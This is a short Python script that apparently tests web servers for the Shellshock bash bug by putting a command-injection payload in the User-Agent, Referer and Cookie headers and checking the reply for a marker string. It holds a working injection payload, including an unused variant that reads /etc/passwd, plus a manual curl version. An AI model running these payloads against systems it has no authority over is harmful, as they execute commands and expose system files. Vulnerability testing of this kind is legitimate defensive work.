#! /usr/bin/python

import urllib.request as ureq
import sys

url=sys.argv[1]

alt_code="() { :; }; echo \"Content-type: text/plain\"; echo; echo;/bin/cat /etc/passwd;";

code="() { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'Shocking';/bin/echo;";

def test(url):
	req=ureq.Request(url)
	req.add_header('User-Agent', code);
	req.add_header('Referer', code);
	req.add_header('Cookie', code);
	try:
		response=ureq.urlopen(req);
	except:
		print("manually test with");
		print("curl -A \"() { :; }; echo "+"\\"+"\"Content-type: text/plain"+"\\"+"\""+"; echo; echo; echo 'Shocking';/bin/echo;\" <url>");
		return;
	if 'Shocking' in str(response.read()):
		print("Vulnerable: FIX IT NOW!!!")
	else:
		print("Clear")

test(url);
#print(str(response.read(), 'utf-8'));
